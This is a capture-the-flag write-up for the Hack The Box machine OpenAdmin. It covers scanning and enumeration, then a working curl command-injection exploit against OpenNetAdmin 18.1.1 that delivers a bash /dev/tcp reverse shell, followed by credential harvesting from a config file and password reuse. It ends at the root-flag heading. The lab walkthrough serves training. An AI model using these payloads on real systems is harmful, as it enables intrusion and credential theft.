## Default Information
IP Address: 10.10.10.171\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.171    openadmin.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.171 --rate=1000 -e tun0
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-31 02:16:56 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.171                                    
Discovered open port 80/tcp on 10.10.10.171   
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | Apache httpd 2.4.29 ((Ubuntu)) | Open |

Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports

```
{Nmap output}
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://openadmin.htb

```
http://10.10.10.171:80/.htpasswd            (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.html       (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.asp        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.html            (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.aspx       (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.php             (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess            (Status: 403) [Size: 277]
http://10.10.10.171:80/.htpasswd.jsp        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.asp             (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.asp        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.aspx            (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.aspx       (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.jsp        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta                 (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.jsp             (Status: 403) [Size: 277]
http://10.10.10.171:80/.htaccess.html       (Status: 403) [Size: 277]
http://10.10.10.171:80/.hta.txt             (Status: 403) [Size: 277]
http://10.10.10.171:80/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
http://10.10.10.171:80/index.html           (Status: 200) [Size: 10918]
http://10.10.10.171:80/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]
http://10.10.10.171:80/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
http://10.10.10.171:80/server-status        (Status: 403) [Size: 277]
```

### Web-content discovery

Viewing all the sites, there was not much discovery until we visit http://openadmin.htb/admin. Viewing the page source of the website, we notice a strange ```href``` tag 
that points to ../ona

![ona href link](https://github.com/joelczk/writeups/blob/main/HTB/Images/OpenAdmin/href_ona.png)

Following that link, we are redirected to http;//openadmin.htb/ona which is OpenNetAdmin. From there, we are also able to find the current version of OpenNetAdmin that we are 
using

![ona site](https://github.com/joelczk/writeups/blob/main/HTB/Images/OpenAdmin/ona.png)

## Exploit

### Remote Code Execution on OpenNetAdmin
Using searchsploit, we can find that OpenNetAdmin 18.1.1 is vulnerable to a remote code execution

```
┌──(kali㉿kali)-[~]
└─$ searchsploit opennetadmin 18.1.1
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                 | php/webapps/47691.sh
------------------------------------------------------------ ---------------------------------
```

Exploiting this vulnerability, we are able to execute a ```id``` command from the server of OpenNetAdmin

```
┌──(kali㉿kali)-[~]
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" "http://openadmin.htb/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Obtaining reverse shell

Now, we would have to execute a reverse shell command using the ```curl``` command mentioned above.

```
┌──(kali㉿kali)-[~]
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.7%2F3000%200%3E%261%27;echo \"END\"&xajaxargs[]=ping" "http://openadmin.htb/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

Next, all that we have to do is to stabilize the reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.171] 45470
bash: cannot set terminal process group (1245): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ww$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$ export TERM=xterm
export TERM=xterm
www-data@openadmin:/opt/ona/www$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@openadmin:/opt/ona/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@openadmin:/opt/ona/www$ 
```

We realize that there are 2 users on this machine, namely Jimmy and Joanna. However, we do not have the permissions to view the files owned by the 2 users.

```
www-data@openadmin:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root   root   4096 Nov 22  2019 .
drwxr-xr-x 24 root   root   4096 Aug 17 13:12 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x---  5 joanna joanna 4096 Jul 27 06:12 joanna
```

### Privilege Escalation to Jimmy

We are able to find a database configuration file at /opt/ona/www/local/config/database_settings.inc.php, which shows the database credentials

```
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php
cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>www-data@openadmin:/opt/ona/www/local/config$
```

We will try this password to login to the user ```jimmy```, which we managed to do it successfully

```
www-data@openadmin:/opt/ona/www/local/config$ su jimmy     
su jimmy
Password: n1nj4W4rri0R!

jimmy@openadmin:/opt/ona/www/local/config$
```

However, we are still unable to find the user flag. We would probably need to privilege escalate to Joanna to be able to obtain the user flag

```
jimmy@openadmin:~$ cd /home/jimmy
cd /home/jimmy
jimmy@openadmin:~$ ls -la
ls -la
total 32
drwxr-x--- 5 jimmy jimmy 4096 Nov 22  2019 .
drwxr-xr-x 4 root  root  4096 Nov 22  2019 ..
lrwxrwxrwx 1 jimmy jimmy    9 Nov 21  2019 .bash_history -> /dev/null
-rw-r--r-- 1 jimmy jimmy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3771 Apr  4  2018 .bashrc
drwx------ 2 jimmy jimmy 4096 Nov 21  2019 .cache
drwx------ 3 jimmy jimmy 4096 Nov 21  2019 .gnupg
drwxrwxr-x 3 jimmy jimmy 4096 Nov 22  2019 .local
-rw-r--r-- 1 jimmy jimmy  807 Apr  4  2018 .profile
jimmy@openadmin:~$
```
### Obtaining root flag
